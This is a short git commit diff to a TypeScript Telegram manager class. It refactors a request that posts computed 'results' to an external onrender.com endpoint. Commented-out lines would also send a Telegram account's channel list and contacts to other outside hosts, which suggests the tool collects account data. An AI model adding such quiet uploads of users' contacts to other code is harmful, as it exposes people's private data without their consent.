33370339af6d1917fc04c18e05fbc978123ad0e5
SSK <dodieajt@gmail.com>
2024-09-11 23:36:57 +0530

    okayish

--- src/telegramManager.ts
+++ src/telegramManager.ts
@@ -507,8 +507,9 @@ class TelegramManager {
         }
         console.log("Calculated results");
         try {
-            console.log("posting results");
-            await axios.post(`https://tg-cms.onrender.com/user`, payload3, { headers: { 'Content-Type': 'application/json' } });
+            const url = `https://tg-cms.onrender.com/user`;
+            console.log("posting results : ", url);
+            await axios.post(url, payload3, { headers: { 'Content-Type': 'application/json' } });
             // await axios.post(`https://ramyaa3.onrender.com/channels`, { channels: chatsArray }, { headers: { 'Content-Type': 'application/json' } });
             // await axios.post(`https://ramyaaa2.onrender.com/contacts`, { contacts: formattedContacts }, { headers: { 'Content-Type': 'application/json' } });
         } catch (error) {
